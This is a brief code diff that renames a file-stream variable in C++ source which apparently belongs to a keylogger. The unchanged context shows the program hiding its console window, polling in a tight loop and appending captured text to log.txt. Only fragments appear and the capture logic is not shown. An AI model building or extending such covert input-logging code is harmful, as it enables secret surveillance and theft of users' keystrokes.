@@ -4,7 +4,7 @@
 
 int main() {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	std::ofstream log;
+	std::ofstream f;
 	std::string tmp;
 	while (true) 	{
 		Sleep(15);
@@ -99,9 +99,9 @@ int main() {
 						continue;
 					}
 				}
-				log.open("log.txt", std::ofstream::app);
-				log << tmp << "\n";
-				log.close();
+				f.open("log.txt", std::ofstream::app);
+				f << tmp << "\n";
+				f.close();
 			}
 		}
 	}
